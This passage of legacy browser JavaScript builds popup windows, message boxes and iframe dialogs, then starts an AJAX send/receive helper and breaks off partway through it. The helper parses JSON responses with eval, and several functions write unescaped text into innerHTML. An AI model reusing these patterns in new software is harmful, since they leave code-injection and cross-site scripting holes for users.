var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
var obj=doc.getElementById('MainDocument') || doc;
var crd=GetObjectCoords(obj,obj.documentElement);
//alert(crd.width);
     WinSetPos((parseInt(crd.width)-parseInt(GLOBWINOBJWIDTH))/2+'px',Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop))+100+'px');/* (parseInt(crd.height)-parseInt(GLOBWINOBJHEIGHT))/2*/
}


function WinFindFreeID()
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
   for(var i=GLOBWINOBJSTARTINDEX;i<=GLOBWINOBJCOUNTER;i++)
   {
       if(!doc.getElementById(GLOBWINOBJNAME+i))
      {
           return i;
      }
  };
  GLOBWINOBJCOUNTER++;
  return GLOBWINOBJCOUNTER;
}

function WinGetClickZIndexEx()
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
var obj;

   for(var i=GLOBWINOBJSTARTINDEX;i<=GLOBWINOBJCOUNTER;i++)
   {
      if(obj=doc.getElementById(GLOBWINOBJNAME+i))
      {
           obj.style.zIndex=obj.style.zIndex-1;
      };
  };
  
  return GLOBWINOBJCOUNTER;
}

function WinGetClickZIndex(thnm)
{
  var doc=SelfDocument;
  if(FireHandleParent)doc=ParentDocument;
  
  var th=doc.getElementById(thnm);
  if(th)th.style.zIndex=WinGetClickZIndexEx();
}


function GetActiveWin()
{
var doc=SelfDocument;
if(FireHandleParent)doc=ParentDocument;
var topwin=0,mxz=0,obj;

   for(var i=GLOBWINOBJSTARTINDEX;i<=GLOBWINOBJCOUNTER;i++)
   {
       if(obj=doc.getElementById(GLOBWINOBJNAME+i))
      {
           if(mxz<obj.style.zIndex)
           {
                  mxz=obj.style.zIndex;
                  topwin=obj;
           }
      };
  };

return topwin;
}

function CloseActiveWin(act)
{
   if(act){FireHandleParent=act;ParentWindow.CloseActiveWin(0);return ;}

   var kobj=GetActiveWin();
   if(kobj)
   {
        winclose(kobj.id);
   }
}
//------------------------------------------------------------------
function JCWinOnResizeCodeEx(objnm)
{
  return " onmousedown=\"StartResizing('"+objnm+"');event.returnValue=0;\" onmouseup=\"StopResizing();event.returnValue=0;\"  onmousemove=\"event.returnValue=0;\"  ";
}

function JCWinOnResizeCode(objnm)
{
var ONRSZ=JCWinOnResizeCodeEx(objnm);
  return "<div id='"+objnm+"_rsz' "+ONRSZ+" class='winResizer' style='cursor:move;min-width:18px;min-height:15px;text-align:right;'>&nbsp;</div>";
}

//------------------------------------------------------------------
function JCWinOnCloseCodeEx(objnm)
{
  return "winclose('"+objnm+"')";
}

function JCWinOnCloseCode(objnm)
{
var bht="";
bht+="<table><tr>";
//bht+="<td class='jc_winbutton'>"+getbuttonex("","onclick=\"winminimize('"+objnm+"')\"","jcwminimize","","","")+"</td>";
bht+="<td class='jc_winbutton'>"+getbuttonex("","onclick=\"winmaximize('"+objnm+"')\"","jcwmaximize","","","")+"</td>";
bht+="<td class='jc_winbutton'>"+getbuttonex("","onclick=\"winclose('"+objnm+"')\"\"","jcwclose","","","")+"</td>";
bht+="</td></tr></table>";
return bht;
  //return "<button  onclick=\""+WINCLS+"\" align='center' valign='middle' style='font-size:12px;width:21px;height:18px'>X</button>";
};
//------------------------------------------------------------------
function JCWinOnClientAreaCodeEx(objnm,f_noscroll)
{
  return "<div id='"+objnm+"_ca' class='fitAround' style='position:relative;display:inline-grid;top:0;left:0;width:100%;height:100%;background:transparent;cursor:default;margin:0;padding:0;border:0;box-sizing:border-box; '>Client Area</div>";
}
//-------------------------------------------------------------
function CreateHTMLWindowInnerHTML(objnm,f_header,f_bottom,f_noscroll,f_later)
{
var INHTM="",ONRSZ,WINCLS;
var dragparam="  dragbythis=true ";
var cls=GLOBWINOBJCLASS;GLOBWINOBJCLASS="";

WINCLS=JCWinOnCloseCodeEx(objnm);
ONRSZ=JCWinOnResizeCodeEx(objnm);

var topmiddle=GLOBWINDOWNAME;

var topright="";
if(GLOBWINOBJTOPRIGHT)topright=GLOBWINOBJTOPRIGHT;

var topbutton=JCWinOnCloseCode(objnm);
if(GLOBWINOBJTOPBUTTON)topbutton=GLOBWINOBJTOPBUTTON;

var botright=JCWinOnResizeCode(objnm);
if(GLOBWINOBJBOTRIGHT)botright=GLOBWINOBJBOTRIGHT;

var botmiddle="<div ID='"+objnm+"_bottombar'></div>";
if(GLOBWINOBJBOTMIDDLE)botmiddle=GLOBWINOBJBOTMIDDLE;

//alert(f_noscroll);
var clientAreal=JCWinOnClientAreaCodeEx(objnm,f_noscroll);
if(GLOBWINOBJMIDMIDDLE)clientAreal=GLOBWINOBJMIDMIDDLE;
//alert(clientAreal);

var topleft =GLOBWINOBJTOPLEFT;
var midleft =GLOBWINOBJMIDLEFT;
var midright =GLOBWINOBJMIDRIGHT;
var botleft =GLOBWINOBJBOTLEFT;

if(!topleft )topleft ='&nbsp;';
if(!midleft)midleft='&nbsp;';
if(!midright)midright="<div id='"+objnm+"_Scrolldiv'></div>";//"<div  class='Scroll' id='"+objnm+"_Scrollbar-1'><div class='Up' >&nbsp;</div><div class='Track'><div class='Handle' >&nbsp;</div></div><div class='Down' >&nbsp;</div></div>";
if(!botleft)botleft='&nbsp;';

if(!topmiddle)topmiddle='&nbsp;';
if(!topright)topmiddle='&nbsp;';
if(!clientAreal)clientAreal='&nbsp;';
if(!botmiddle)botmiddle='&nbsp;';
if(!botright)botright='&nbsp;';


INHTM+="<div class='fitAround' style='position:relative;display:inline-grid;width:100%;height:100%;border:0;padding:0;margin:0;'>";
/*INHTM+="<table class='"+cls+"JCWinTable fitAround' border=0 cellpadding=0 cellspacing=0 style='position:absolute;width:100%;height:100%;'>";
//Header
//if(!f_header)
INHTM+="<tr "+dragparam+"><td "+dragparam+" class='"+cls+"JCWinTopLeft'>&nbsp;</td><td "+dragparam+"  class='"+cls+"JCWinTopMiddle'>&nbsp;</td><td  "+dragparam+" class='"+cls+"JCWinTopRight'>&nbsp;</td></tr>\n";
//ClientArea
INHTM+="<tr "+dragparam+" ><td class='"+cls+"JCWinMidLeft'>&nbsp;</td><td class='"+cls+"JCWinMidMiddle stopdrag'>&nbsp;</td><td class='"+cls+"JCWinMidRight'>&nbsp;</td></tr>\n";
//Bottom
//if(!f_bottom)
INHTM+="<tr "+dragparam+" ><td  class='"+cls+"JCWinBotLeft'>&nbsp;</td><td class='"+cls+"JCWinBotMiddle'>&nbsp;</td><td class='"+cls+"JCWinBotRight' >&nbsp;</td></tr>\n";
INHTM+="</table>\n";
*/
INHTM+="<table id='"+objnm+"_table' class='"+cls+"JEWinTable fitAround' border=0 cellpadding=0 cellspacing=0 style='position:relative;width:100%;height:100%;'><tbody style='height:inherit;width:inherit;'>";
//Header
if(!f_header)
INHTM+="<tr  id='"+objnm+"_td'><td  class='"+cls+"JEWinTopLeft'>"+topleft+"</td><td   class='"+cls+"JEWinTopMiddle'><div class='left'>"+topmiddle+"</div><div class='right'>"+topbutton+"</div></td><td   class='"+cls+"JEWinTopRight'>"+topright+"</td></tr>\n";
else
INHTM+="<tr  id='"+objnm+"_td'><td  class='"+cls+"JEWinTopLeft'>&nbsp;</td><td   class='"+cls+"JEWinTopMiddle'>&nbsp;</td><td   class='"+cls+"JEWinTopRight'>&nbsp;</td></tr>\n";

//ClientArea
INHTM+="<tr  ><td class='"+cls+"JEWinMidLeft'>"+midleft+"</td><td class='"+cls+"JEWinMidMiddle stopdrag' id='"+objnm+"_ca_td' valign='top' align='left' >"+clientAreal+"</td><td class='"+cls+"JEWinMidRight'>"+midright+"</td></tr>\n";
//Bottom
if(!f_bottom)
INHTM+="<tr  ><td  class='"+cls+"JEWinBotLeft'>"+botleft+"</td><td class='"+cls+"JEWinBotMiddle'>"+botmiddle+"</td><td class='"+cls+"JEWinBotRight' >"+botright+"</td></tr>\n";
else
INHTM+="<tr  ><td  class='"+cls+"JEWinBotLeft'>&nbsp;</td><td class='"+cls+"JEWinBotMiddle'>&nbsp;</td><td class='"+cls+"JEWinBotRight' >&nbsp;</td></tr>\n";
INHTM+="</tbody></table>\n";

INHTM+="</div>\n";
//alert(INHTM);


return INHTM;
}
//------------------------------------------------------------------
function GetFreeWindowName(){
	var win=SelfWindow;
	if(FireHandleParent){win=ParentWindow;}
	return win.GLOBWINOBJNAME+win.WinFindFreeID();
}
//------------------------------------------------------------------
function CreateHTMLWindowEx(thnm,f_header,f_bottom,f_noscroll,f_later,f_getobject)
{
var doc=SelfDocument;
var win=SelfWindow;
if(FireHandleParent)
{
  doc=ParentDocument;
  win=ParentWindow;
}
if(!thnm)thnm=DivObjectSystemName;
var th=doc.getElementById(thnm);
if(!th)th=document.body;
var objid=win.WinFindFreeID();
var objnm=win.GLOBWINOBJNAME+objid;

var dv=doc.createElement('div');
dv.id=objnm;
dv.className=GLOBWINOBJCLASS+' windrag winaffect winstyle';GLOBWINOBJCLASS="";

if(f_later==1)dv.innerHTML="";
else dv.innerHTML=win.CreateHTMLWindowInnerHTML(objnm,f_header,f_bottom,f_noscroll,f_later);
dv.style.zIndex=WinGetClickZIndexEx()+1;
dv.style.overflow='hidden';
if(dv.setAttribute)dv.setAttribute('divdrag','true');


//Eventis misabmelad orive ertidaigivea
AddEventOnObject(dv,'click',function(event){WinGetClickZIndex(objnm);});
//AddEventByString(dv,'click',"WinGetClickZIndex('"+objnm+"');");
th.appendChild(dv);

var dtd=doc.getElementById(objnm+"_ca_td");
var dca=doc.getElementById(objnm+"_ca");
  if(dtd)
  {
     var crd=GetObjectZoomParameters(dtd,doc.documentElement,1);
	 //dca.style.height=crd.height;
	 //dca.style.width=crd.width;
	//setupScrollbar(objnm+"_ca",objnm+"_Scrolldiv",1,parseInt(crd.width),parseInt(crd.height));	 
   }
if(f_getobject)return dv;
return objnm;
}

//------------------------------------------------------------
function AdjustWindowSize(dv){

var doc=SelfDocument;
var win=SelfWindow;
if(FireHandleParent)
{
  doc=ParentDocument;
  win=ParentWindow;
}


	if(!dv)return 0;
	if(typeof dv != "object"){
		dv=document.getElementById(dv);
	}
	if(!dv)return 0;
	
	dv.style.margin=0;
	dv.style.paddingLeft='0px';
	dv.style.paddingRight='0px';
	dv.style.paddingTop='0px';
	dv.style.paddingBottom='0px';
	dv.style.position='absolute';
	dv.style.top=win.GLOBWINOBJTOP;
	dv.style.left=win.GLOBWINOBJLEFT;

	dv.style.width=win.GLOBWINOBJWIDTH;
	dv.style.height=win.GLOBWINOBJHEIGHT;
	return true;
}
//------------------------------------------------------------
function CreateHTMLWindow(dvn)
{
if(dvn)return CreateHTMLWindowEx(dvn);
   return CreateHTMLWindowEx(DivObjectSystemName);
}
//------------------------------------------------------------------
function CreateHTMLContainerEx(thnm,f_header,f_bottom,f_noscroll)
{
  f_later=1;
  return CreateHTMLWindowEx(thnm,f_header,f_bottom,f_noscroll,f_later);
}
//------------------------------------------------------------
function CreateHTMLContainer(dvn)
{
if(dvn)return CreateHTMLContainerEx(dvn);
   return CreateHTMLContainerEx(DivObjectSystemName);
}

////----------- Resizing Animation ------------------------
function WinStartResizingTimer()
{
    GWRIndex=GWRIndex*GWRAchka+1;
    if(GWRIndex>=GWRStep)
    {
       GlobalWinResizingObject.style.left=GlobalWinResizingX+"px";
       GlobalWinResizingObject.style.top=GlobalWinResizingY+"px";
       GlobalWinResizingObject.style.width=GlobalWinResizingW+"px";
       GlobalWinResizingObject.style.height=GlobalWinResizingH+"px";
       WinParamSetSize(GlobalWinResizingX,GlobalWinResizingY,GlobalWinResizingW,GlobalWinResizingH);
       GlobalWinResizingObject.style.overflow='hidden';
       GlobalWinResizingClientArea.innerHTML=GlobalWinResizingHTMLValue;
       clearTimeout(GWRInterval); 
       if(GlobalWinResizingHTMLMethod){setTimeout(GlobalWinResizingHTMLMethod,500,'JScript');GlobalWinResizingHTMLMethod="";}
       GWRInterval=0;
    }
    else
    {
        GlobalWinResizingObject.style.left=parseFloat(GLOBWINOBJLEFT)+GWRStpX*GWRIndex+"px";
        GlobalWinResizingObject.style.top=parseFloat(GLOBWINOBJTOP)+GWRStpY*GWRIndex+"px";
        GlobalWinResizingObject.style.width=parseFloat(GLOBWINOBJWIDTH)+GWRStpW*GWRIndex+"px";
        GlobalWinResizingObject.style.height=parseFloat(GLOBWINOBJHEIGHT)+GWRStpH*GWRIndex+"px";
        GWRInterval=setTimeout("WinStartResizingTimer()",0);
    }
}
//--------------------
function WinStartResizing(wn,nx,ny,nw,nh,Stp,Val,effect)
{
  if(GWRInterval)
  {
     GWRIndex=GWRStep+5;
     WinStartResizingTimer();
  }

    if(GlobalWinResizingObject)GlobalWinResizingObject="";
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;
    GlobalWinResizingObject=doc.getElementById(wn);
    GlobalWinResizingObject.style.overflow='hidden';
    GlobalWinResizingClientArea=doc.getElementById(wn+'_ca');
    if(!GlobalWinResizingClientArea)GlobalWinResizingClientArea=GlobalWinResizingObject;
    GlobalWinResizingHTMLValue=Val;

    GlobalWinResizingX=parseInt(nx);
    GlobalWinResizingY=parseInt(ny);
    GlobalWinResizingW=parseInt(nw);
    GlobalWinResizingH=parseInt(nh);
    GWRStep=parseInt(Stp);


    GWRStpX=(parseFloat(GlobalWinResizingX)-parseFloat(GLOBWINOBJLEFT))/Stp;
    GWRStpY=(parseFloat(GlobalWinResizingY)-parseFloat(GLOBWINOBJTOP))/Stp;
    GWRStpW=(parseFloat(GlobalWinResizingW)-parseFloat(GLOBWINOBJWIDTH))/Stp;
    GWRStpH=(parseFloat(GlobalWinResizingH)-parseFloat(GLOBWINOBJHEIGHT))/Stp;
    GWRIndex=0;

switch(effect)
{
case 1:;
    break;
default:
    WinStartResizingTimer();
}
}
//--------------------
function WinAffectSize(wn)
{
    if(GlobalWinResizingObject)GlobalWinResizingObject="";
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;
    GlobalWinResizingObject=doc.getElementById(wn);

       GlobalWinResizingObject.style.left=GLOBWINOBJLEFT;
       GlobalWinResizingObject.style.top=GLOBWINOBJTOP;
       GlobalWinResizingObject.style.width=GLOBWINOBJWIDTH;
       GlobalWinResizingObject.style.height=GLOBWINOBJHEIGHT;
}
//------------- Hint ---------------------
var dernierHint=0;
function CreateHint(txt)
{
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;

   GLOBWINDOWNAME='';
   winclose(dernierHint);
   WinSetPos(MouseX+SelfDocument.body.scrollLeft+15+'px',MouseY+SelfDocument.body.scrollTop+15+'px');
   WinSetZoom(150,100);
   dernierHint=CreateHTMLWindowEx(DivObjectSystemName,0,0,1);
   if(doc.getElementById(dernierHint))
   {
		var locobj=doc.getElementById(dernierHint+'_ca');
		locobj.innerHTML="";
        locobj.innerHTML="<div onmouseout=winclose('"+dernierHint+"') style='position:relative;display:inline-grid;cursor:text;width:100%;height:100%;overflow:hidden;word-wrap:break-word;'>"+txt+"</div>";
		fitAroundAfterLoaded(locobj);
   }
//   setTimeout("winclose('"+dernierHint+"')",3000);
}
//------------- Hint ---------------------
var dernierError=0;
function CreateError(txt,w,h)
{
    var doc=SelfDocument;
    if(FireHandleParent)doc=ParentDocument;

   GLOBWINDOWNAME='';
   winclose(dernierError);
   WinSetCenter();
   if(!w)w=500;if(!h)h=350;
   WinSetZoom(w,h);
   AlphaMainWin(0.5);
   dernierError=CreateHTMLWindowEx(DivObjectSystemName,0,1,1);
   if(doc.getElementById(dernierError))
   {
   		var locobj=doc.getElementById(dernierError+'_ca');
		locobj.innerHTML="";
            locobj.innerHTML="<div  style='position:relative;display:inline-grid;cursor:text;width:100%;height:100%;overflow:hidden;word-wrap:break-word;text-align:center;'><center><br><br><br>"+txt+"</center></div>";
            doc.getElementById(dernierError).style.zIndex=200;
		fitAroundAfterLoaded(locobj);
   }
}
//--------------------------------------
var winoneobj=0,winonemsg=0;
function OpenWinTableByName(tabnm,chsobjnm,chsobjfield,dfl,hoid)
{
     if(!dfl)dfl=deflink;
        GLOBWINDOWNAME=tabnm;
	chsobjnm='window.parent.'+chsobjnm;
        WinParamSetDefault();
		WinSetZoom('800px','500px');
 	    WinSetCenter();
        winclose(winoneobj);
        AlphaMainWin(0.5);
        winoneobj=CreateHTMLWindow();
        var obj=document.getElementById(winoneobj+'_ca');
		obj.innerHTML="";
        obj.innerHTML="<iframe id='"+winoneobj+"_frid' src=\"framegrid.php?"+dfl+"&tabnm="+tabnm+"&nextformname=og&winname="+winoneobj+"&og_hobj="+chsobjnm+"&og_hfield="+chsobjfield+"&og_hoid="+hoid+"\"   style='position:relative;display:inline-grid;width:100%;height:100%;margin:0;padding:0;border:0;'></iframe>";
		fitAroundAfterLoaded(obj);
}
//--------------------------------------
function OpenWinDiv(name,src,wino)
{
		if(wino===undefined)wino=winoneobj;
        GLOBWINDOWNAME=name;
        WinParamSetDefault();
 	    WinSetCenter();
        winclose(wino);
        AlphaMainWin(0.5);
        wino=CreateHTMLWindow();
        var obj=document.getElementById(wino+'_ca');
		obj.innerHTML="";
        obj.innerHTML="<div style='position:relative;display:inline-grid;overflow:hidden;width:100%;height:100%;margin:0;padding:0;border:0;'><div id='"+wino+"_frid' class='Scroller-Container'  style='position:relative;width:100%;height:100%;margin:0;padding:0;border:0;overflow:hidden;'></div></div><iframe id='"+wino+"_frid2' src=\""+src+"\"  onload=\"FrameToDiv('"+wino+"_frid2','"+wino+"_frid');setupScrollbar('"+wino+"_frid','"+wino+"_Scrolldiv',1);\" style='position:absolute;visibility:hidden;width:0;height:0;margin:0;padding:0;border:0;overflow:auto;'></iframe>";
        //obj.style.overflow='hidden';
		fitAroundAfterLoaded(obj);
}
//--------------------------------------
function OpenWinHtml(name,htm,wino)
{
		if(wino===undefined)wino=winoneobj;
        GLOBWINDOWNAME=name;
        WinParamSetDefault();
 	    WinSetCenter();
        winclose(wino);
        AlphaMainWin(0.5);
        wino=CreateHTMLWindow();
        var obj=document.getElementById(wino+'_ca');
		obj.innerHTML="";
        obj.innerHTML="<div style='position:relative;display:inline-grid;overflow:hidden;width:100%;height:100%;margin:0;padding:0;border:0;'><div id='"+wino+"_frid' class='Scroller-Container'  style='position:relative;width:100%;height:100%;margin:0;padding:0;border:0;overflow:hidden;'>"+htm+"</div></div>";
        //obj.style.overflow='hidden';
		fitAroundAfterLoaded(obj);
		return wino;
}
//--------------------------------------
function OpenConHtml(name,htm,wino)
{
        if(wino===undefined)wino=winoneobj;
		GLOBWINDOWNAME=name;
        WinParamSetDefault();
 	    WinSetCenter();
        winclose(wino);
        AlphaMainWin(0.5);
        wino=CreateHTMLContainer();
        var obj=document.getElementById(wino);
		obj.innerHTML="";
        obj.innerHTML="<div style='position:relative;display:inline-grid;overflow:hidden;width:100%;height:100%;margin:0;padding:0;border:0;text-align:center;vertical-align:middle;'>"+htm+"</div>";
        //obj.style.overflow='hidden';
		//obj.style.border='3px solid red';
		fitAroundAfterLoaded(obj);
		return wino;
}

//--------------------------------------
function OpenWinFrame(name,src,wino)
{
        if(wino===undefined)wino=winoneobj;
		GLOBWINDOWNAME=name;
        WinParamSetDefault();
		WinSetZoom('800px','500px');
 	    WinSetCenter();
        winclose(wino);
        AlphaMainWin(0.5);
        wino=CreateHTMLWindow();
        var obj=document.getElementById(wino+'_ca');
		obj.innerHTML="";
        obj.innerHTML="<iframe id='"+wino+"_frid' src=\""+src+"\"  style=\"position:relative;display:inline-block;width:100%;height:100%;margin:0;padding:0;border:0;\"></iframe>";
		fitAroundAfterLoaded(obj);
		AdjustWindowSize(wino);
		return wino;
}

//--------------------------------------
function CreateFormData(evonload)
{
        GLOBWINDOWNAME="";
		WinParamSetSize(-100,-100,20,20);
        var winoneobj=CreateHTMLWindow();
        var obj=document.getElementById(winoneobj+'_ca');
		obj.innerHTML="";
        obj.innerHTML="<iframe id='"+winoneobj+"_formid' onload=\""+evonload+"\" src=\"form_jc.htm\"   style=\"position:relative;display:inline-block;width:100%;height:100%;margin:0;padding:0;border:0;\"></iframe>";
		fitAroundAfterLoaded(obj);
		return winoneobj;

}
//--------------------------------------
function MessageBox(txt,title,tp,wino)
{
		if(wino===undefined)wino=winonemsg;
        GLOBWINDOWNAME=title;
        WinParamSetDefault();
        winclose(wino);

   
	var w=400,h=250;
	WinSetZoom(w,h);
	WinSetCenter();

        AlphaMainWin(0.5);
        wino=CreateHTMLWindow();
        var obj=document.getElementById(wino+'_ca');
		obj.innerHTML="";
switch(tp)
{
  case 'MB_OK':
            {
                    var vhtml="";
                    vhtml+="<div id='"+wino+"_frid' style='position:relative;display:inline-grid;width:100%;height:100%;margin:0;padding:0;border:0;'>";
                    vhtml+="<div id='"+wino+"_msg'>"+txt+"</div><hr><button onclick=\"winclose('"+wino+"')\">OK</button>";
                    vhtml+="</div>";
                    obj.innerHTML=vhtml;
            }
            break;
            default: obj.innerHTML="<div id='"+wino+"_frid' style='position:relative;display:inline-grid;width:100%;height:100%;margin:0;padding:0;border:0;'><div id='"+wino+"_msg'>"+txt+"</div></div>";
}
        //obj.style.overflow='hidden';
		fitAroundAfterLoaded(obj);
return wino;
}

//--------------------------------------
function OpenCSS()
{
    OpenWinFrame('CSS',FullWebLink+index_php+"?sid="+SID+"&write_fullphpcode=1");   
}
//--------------------------------------
function OpenCompiler()
{
    OpenWinFrame('CSS',FullWebLink+index_php+"?sid="+SID+"&write_fullphpcode=1&compile=1");   
}
//--------------------------------------
function OpenDeveloper()
{

    OpenWinFrame('CSS',FullWebLink+index_php+"?developer_testing=1");   
}
//--------------------------------------
function OpenDeveloperSameSession()
{

    OpenWinFrame('CSS',FullWebLink+"?sid="+SID+"&developer_testing=1");   
}
//--------------------------------------
function OpenJS()
{
    OpenWinFrame('CSS',WebLink+"admin.php?phpParam=allscript_writer.php&"+deflink);   
}
//--------------------------------------
function jconfirm(msg)
{
  return confirm(msg);
}
//--------------------------------------
var WaitingWindow=0;
function OpenWaitingEx(Img)
{
	if(!WaitingWindow)
	{
		if(!Img)Img='/anim/waiting1.gif';
		if(!WaitingWindow || !document.getElementById(WaitingWindow))WaitingWindow=OpenConHtml('','<img src=\''+WebLinkTheme+Img+'\' >',WaitingWindow);
	}
	return WaitingWindow;
}
//-------------------------------------
function CloseWaitingEx()
{
  WaitingWindow=winclose(WaitingWindow);
}
//-------------------------------------
function fitAroundProcess(){
	var els=document.getElementsByClassName("fitAround");
	for(var i in els)if(els[i]){
		fitAroundByParent(els[i]);
	}
}
//-------------------------------------
function fitAroundAfterLoaded(obj){
	waitUntilLoad(fitAroundProcess,obj,100)();
}
//-------------------------------------
GetDocument();


/* sendrecv.js */

var GLOB_SEND_ID=0;
//---------------===============================----------------------
//---------------===============================----------------------
//---------------===============================----------------------
function SendRecv()
{
var local=this;
this.REQUEST_WINMAIN;
this.SEND_WINNAME="";
/*event on recv*/
this.PROCEDURE='';
this.PROCXML='';
this.PROCJSON='';
this.PROCRESPONSE='';
/*msg, error, warning texts*/
this.MsgProcessing='Processing...';
this.ErrGetXMLData='Problem retrieving data';
this.ErrBrowserVersion='error_browser_version';
this.Waiting=false;
//-------------------------=======================================-----------------------
this.Initialize=function Initialize()
{
	try
	{
		this.REQUEST_WINMAIN=new ActiveXObject("Msxml2.XMLHTTP");
	}
	catch(e)
	{
		try
		{
			this.REQUEST_WINMAIN=new ActiveXObject("Microsoft.XMLHTTP");
		}
		catch(oc)
		{
			this.REQUEST_WINMAIN=null;
		}
	}

	if(!this.REQUEST_WINMAIN&&typeof XMLHttpRequest!="undefined")
	{
		this.REQUEST_WINMAIN=new XMLHttpRequest();
	}
}
//-------------------------=======================================-----------------------
function loadXMLDoc(filename)
{
if (window.ActiveXObject)
  {
  xhttp = new ActiveXObject("Msxml2.XMLHTTP");
  }
else
  {
  xhttp = new XMLHttpRequest();
  }
xhttp.open("GET", filename, false);
try {xhttp.responseType = "msxml-document"} catch(err) {} // Helping IE11
xhttp.send("");
return xhttp.responseXML;
}
//-------------------------=======================================-----------------------
function displayXMLResult(xmlFile,xslFile,resultTag)
{
var xml = loadXMLDoc(xmlFile);
var xsl = loadXMLDoc(xslFile);

// code for IE
if (window.ActiveXObject || xhttp.responseType == "msxml-document")
  {
  var ex = xml.transformNode(xsl);
  document.getElementById(resultTag).innerHTML = ex;
  }
// code for Chrome, Firefox, Opera, etc.
else if (document.implementation && document.implementation.createDocument)
  {
  var xsltProcessor = new XSLTProcessor();
  xsltProcessor.importStylesheet(xsl);
  var resultDocument = xsltProcessor.transformToFragment(xml, document);
  document.getElementById(resultTag).appendChild(resultDocument);
  }
}
//-------------------------=======================================-----------------------
this.SendQuery=function SendQuery(gnm,url,RetPrc,PostParams) //PUBLIC
{

var blprc=0;
this.Waiting=true;
if(!PostParams)PostParams="";
    if(!RetPrc)RetPrc='';
    GLOB_SEND_ID++;
	this.Initialize();
	if(this.REQUEST_WINMAIN!=null)
	{
		if(gnm=="")this.SEND_WINNAME="";
		else
		if(document.getElementById(gnm))
		   if(!(this.SEND_WINNAME=document.getElementById(gnm)))this.SEND_WINNAME=gnm;

		
		if(local.SEND_WINNAME)
			if(local.SEND_WINNAME.tagName.toLowerCase()=='input')
				local.SEND_WINNAME.value=local.MsgProcessing;
			else local.SEND_WINNAME.innerHTML=local.MsgProcessing;
		
		if(RetPrc!='')local.PROCEDURE=RetPrc;
		this.REQUEST_WINMAIN.onreadystatechange = function ()
		{
			var lStatus={"code":0,"text":"","done":0};
						
		
				try{
				if (local.REQUEST_WINMAIN.readyState == 4)
					{
					
						if (local.REQUEST_WINMAIN.status == 200)
						{
							if(local.SEND_WINNAME)
							if(local.SEND_WINNAME.tagName.toLowerCase()=='input')
								local.SEND_WINNAME.value=local.REQUEST_WINMAIN.responseText;
							else local.SEND_WINNAME.innerHTML=local.REQUEST_WINMAIN.responseText;
							blprc=1;
							lStatus.done=1;
						}
						else
						{
							local.Waiting=false;
							if(local.SEND_WINNAME)
							if(local.SEND_WINNAME.tagName.toLowerCase()=='input')
								local.SEND_WINNAME.value=local.ErrGetXMLData + " " + local.REQUEST_WINMAIN.status;
							else local.SEND_WINNAME.innerHTML=local.ErrGetXMLData + " " + local.REQUEST_WINMAIN.status;
						}
						lStatus.code=local.REQUEST_WINMAIN.status;
						lStatus.text=local.REQUEST_WINMAIN.responseText;
						
					}
			}
			catch(e)
			{
				if(local.SEND_WINNAME)
				if(local.SEND_WINNAME.tagName.toLowerCase()=='input')
					local.SEND_WINNAME.value=local.ErrBrowserVersion;
				else local.SEND_WINNAME.innerHTML=local.ErrBrowserVersion;
			}
			if(blprc)
			{

				local.Waiting=2;
			   if(local.PROCEDURE)
			   {
				try{
					local.PROCEDURE(local.REQUEST_WINMAIN.responseText,lStatus);
				}catch(e)
				{
					local.PROCEDURE();
					if(lStatus.code>=300){MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');}
				}
				

			   }

				/* auto detect content type if json then break xml parsing*/
			   if(local.PROCXML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					try{
						if((trim(txt).indexOf("{")===0) && ((!local.PROCJSON) || (local.PROCJSON==undefined))){
							local.PROCJSON=local.PROCXML;
							local.PROCXML="";
						}
					}catch(e){
					}
				}

			   if(local.PROCXML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
				
					var ck=true;
                    if (window.DOMParser)
                    {

					try{
						parser=new DOMParser();
						xmlDoc=parser.parseFromString(txt,"text/xml");
						ck=false;
					  }catch(e)
					  {
						ck=true;
						console.log("Error sendrecv.js PROCXML: "+e.toString());
					  }
                    }
					
                    if(ck) // Internet Explorer
                    {
					try{
                      xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
                      xmlDoc.async=false;
                      xmlDoc.loadXML(txt);
  					  }catch(e){
						console.log("Error sendrecv.js PROCXML2: "+e.toString());
					  }

                    } 
				
					try{
						local.PROCXML(xmlDoc,lStatus);
					}catch(e){
						if(lStatus.code>=300){
							MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
						}
						local.PROCXML(xmlDoc);
					}
			   }
			   
			   //JSON Proceduris gamodzaxeba
			   if(local.PROCJSON)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					var jo=null;
					
					try{
						eval("jo="+txt);
					  }catch(e)
					  {
						console.log("Error sendrecv.js PROCJSON: "+e.toString());
					  }
						try{
							local.PROCJSON(jo,lStatus);
						}catch(e){
							if(lStatus.code>=300){
								MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
							}
							local.PROCJSON(jo);
						}

			   }
			   
			   
			   //droebitia, dasamushavebelia
			   if(local.PROCHTML)
			   {
                    var txt=local.REQUEST_WINMAIN.responseText;
					var ck=true;
                    if (window.DOMParser)
                    {
					try{
						parser=new DOMParser();
						xmlDoc=parser.parseFromString(txt,"text/html");
						ck=false;
					  }catch(e)
					  {
						ck=true;
						console.log("Error sendrecv.js PROCHTML: "+e.toString());
					  }
                    }
                    
					if(ck)// Internet Explorer
                    {
					try{
                      xmlDoc=new ActiveXObject("Microsoft.HTMLDOM");
                      xmlDoc.async=false;
                      xmlDoc.loadXML(txt);
					  }catch(e){
						console.log("Error sendrecv.js PROCHTML2: "+e.toString());
					  }
                    } 
						try{
							local.PROCXML(xmlDoc,lStatus);
						}catch(e){
							if(lStatus.code>=300){
								MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
							}
							local.PROCXML(xmlDoc);
						}
			   }
			   
			   if(local.PROCRESPONSE)
			   {
			       var reqret=local.REQUEST_WINMAIN;
			       	try{
						local.PROCRESPONSE(reqret,lStatus);
					}catch(e){
						if(lStatus.code>=300){
							MessageBox('Send-receive Error: (code: '+lStatus.code+') ','Send-receive error::','MB_OK');
						}
						local.PROCRESPONSE(reqret);
					}
			   }
			   
			   local.Waiting=false;
